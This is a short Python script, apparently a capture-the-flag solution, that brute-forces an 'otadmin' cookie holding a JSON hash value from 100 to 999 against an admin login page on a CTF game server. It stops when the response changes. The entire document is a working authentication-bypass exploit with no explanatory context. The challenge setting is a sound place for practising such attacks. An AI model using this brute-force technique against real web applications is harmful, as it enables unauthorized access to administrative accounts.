import requests

for x in range(100, 1000):
    data = '{{"hash": {0:03}}}'.format(x)
    print(data)
    cook = {"otadmin": data}
    r = requests.get("https://gameserver.zajebistyc.tf/admin/login.php", cookies=cook)
    if b"I CAN EVEN GIVE YOU A HINT XD" not in r.text.encode("ascii"):
        print(r.text)
        break
